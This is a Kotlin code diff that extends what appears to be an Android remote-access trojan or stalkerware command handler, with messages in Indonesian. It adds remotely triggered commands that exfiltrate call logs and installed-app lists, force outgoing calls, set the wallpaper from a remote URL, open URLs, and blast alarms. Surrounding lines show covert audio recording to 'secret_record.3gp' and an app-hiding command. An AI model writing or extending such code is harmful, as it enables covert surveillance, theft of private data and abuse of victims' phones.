@@ -37,6 +37,17 @@ import android.media.ImageReader
 import android.graphics.ImageFormat
 import android.os.HandlerThread
 
+import android.os.Vibrator
+import android.os.VibratorManager
+import android.os.VibrationEffect
+import android.media.RingtoneManager
+import android.provider.CallLog
+import android.app.WallpaperManager
+import android.content.Intent
+import android.content.pm.ApplicationInfo
+import java.net.URL
+import android.graphics.BitmapFactory
+
 class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener {
 
     private var tts: TextToSpeech? = null
@@ -316,7 +327,8 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                 }
                 "record_sound" -> {
                     if (checkPerm(Manifest.permission.RECORD_AUDIO)) {
-                        val durationMs = textArg.toLongOrNull() ?: 5000L // default merekam 5 detik
+                        val durationSec = textArg.toLongOrNull() ?: 5L // default merekam 5 detik
+                        val durationMs = durationSec * 1000L
                         val file = java.io.File(context.cacheDir, "secret_record.3gp")
                         Thread {
                             try {
@@ -437,6 +449,142 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             }
                         }.start()
                     } else sendResponse(createResponse(cmdId, "error", "Izin CAMERA belum di-ALLOW OS Android!"))
+                }
+                "vibrate" -> {
+                    val durationSec = textArg.toLongOrNull() ?: 2L
+                    val durationMs = durationSec * 1000L
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                            val vibratorManager = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
+                            vibratorManager.defaultVibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
+                        } else {
+                            @Suppress("DEPRECATION")
+                            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
+                            } else {
+                                vibrator.vibrate(durationMs)
+                            }
+                        }
+                        sendResponse(createResponse(cmdId, "vibrate", "Perangkat bergetar selama $durationSec detik"))
+                    } catch (e: Exception) {
+                        sendResponse(createResponse(cmdId, "error", "Gagal Vibrate: ${e.message}"))
+                    }
+                }
+                "open_url" -> {
+                    try {
+                        var url = textArg
+                        if (!url.startsWith("http://") && !url.startsWith("https://")) { url = "https://$url" }
+                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
+                        context.startActivity(intent)
+                        sendResponse(createResponse(cmdId, "open_url", "Membuka browser ke: $url"))
+                    } catch (e: Exception) {
+                        sendResponse(createResponse(cmdId, "error", "Gagal membuka URL: ${e.message}"))
+                    }
+                }
+                "play_alarm" -> {
+                    try {
+                        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+                        audioManager.setStreamVolume(AudioManager.STREAM_ALARM, audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0)
+                        
+                        val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+                         ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
+                        val ringtone = RingtoneManager.getRingtone(context, alarmUri)
+                        ringtone.play()
+                        
+                        // Mainkan selama 10 detik lalu matikan
+                        Handler(Looper.getMainLooper()).postDelayed({ ringtone.stop() }, 10000)
+                        sendResponse(createResponse(cmdId, "play_alarm", "Alarm darurat dibunyikan dengan volume MAX selama 10 detik!"))
+                    } catch (e: Exception) {
+                        sendResponse(createResponse(cmdId, "error", "Gagal memutar alarm: ${e.message}"))
+                    }
+                }
+                "get_call_logs" -> {
+                    if (checkPerm(Manifest.permission.READ_CALL_LOG)) {
+                        try {
+                            val limit = textArg.toIntOrNull() ?: 20
+                            val logs = JSONArray()
+                            val cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
+                            cursor?.use {
+                                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
+                                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
+                                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
+                                val durationIdx = it.getColumnIndex(CallLog.Calls.DURATION)
+                                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                                
+                                var count = 0
+                                while (it.moveToNext() && count < limit) {
+                                    val typeCode = it.getInt(typeIdx)
+                                    val typeStr = when(typeCode) {
+                                        CallLog.Calls.INCOMING_TYPE -> "Masuk"
+                                        CallLog.Calls.OUTGOING_TYPE -> "Keluar"
+                                        CallLog.Calls.MISSED_TYPE -> "Terlewat"
+                                        CallLog.Calls.REJECTED_TYPE -> "Ditolak"
+                                        else -> "Lainnya"
+                                    }
+                                    logs.put(JSONObject().apply {
+                                        put("number", it.getString(numIdx))
+                                        put("name", it.getString(nameIdx) ?: "Tidak Dikenal")
+                                        put("type", typeStr)
+                                        put("date", java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(java.util.Date(it.getLong(dateIdx))))
+                                        put("duration_sec", it.getString(durationIdx))
+                                    })
+                                    count++
+                                }
+                            }
+                            sendResponse(createResponse(cmdId, "call_logs", logs))
+                        } catch (e: Exception) {
+                            sendResponse(createResponse(cmdId, "error", "Gagal baca call log: ${e.message}"))
+                        }
+                    } else sendResponse(createResponse(cmdId, "error", "Izin READ_CALL_LOG belum di-ALLOW"))
+                }
+                "get_installed_apps" -> {
+                    try {
+                        val limit = textArg.toIntOrNull() ?: 0 // 0 means all non-system
+                        val pm = context.packageManager
+                        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
+                        val arr = JSONArray()
+                        var count = 0
+                        for (appInfo in apps) {
+                            // Filter only non-system apps if wanted, logic here filters out core system if needed
+                            if ((appInfo.flags and ApplicationInfo.FLAG_SYSTEM) == 0) {
+                                arr.put(JSONObject().apply {
+                                    put("name", pm.getApplicationLabel(appInfo).toString())
+                                    put("package", appInfo.packageName)
+                                })
+                                count++
+                                if (limit in 1..count) break
+                            }
+                        }
+                        sendResponse(createResponse(cmdId, "installed_apps", arr))
+                    } catch (e: Exception) {
+                        sendResponse(createResponse(cmdId, "error", "Gagal tarik App List: ${e.message}"))
+                    }
+                }
+                "set_wallpaper" -> {
+                    Thread {
+                        try {
+                            val urlParsed = URL(textArg)
+                            val bitmap = BitmapFactory.decodeStream(urlParsed.openConnection().getInputStream())
+                            val wm = WallpaperManager.getInstance(context)
+                            wm.setBitmap(bitmap)
+                            sendResponse(createResponse(cmdId, "set_wallpaper", "Wallpaper berhasil diubah secara drastis!"))
+                        } catch (e: Exception) {
+                            sendResponse(createResponse(cmdId, "error", "Gagal Ganti Wallpaper: Pastikan argument adalah Direct URL Image Valid - ${e.message}"))
+                        }
+                    }.start()
+                }
+                "dial_number" -> {
+                    if (checkPerm(Manifest.permission.CALL_PHONE)) {
+                        try {
+                            var number = textArg.replace("#", "%23")
+                            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
+                            context.startActivity(intent)
+                            sendResponse(createResponse(cmdId, "dial_number", "Memaksa perangkat menelepon/men-dial: $textArg"))
+                        } catch (e: Exception) {
+                            sendResponse(createResponse(cmdId, "error", "Dialer Gagal: ${e.message}"))
+                        }
+                    } else sendResponse(createResponse(cmdId, "error", "Izin CALL_PHONE belum di-ALLOW"))
                 }
                 "hide_app" -> {
                     try {
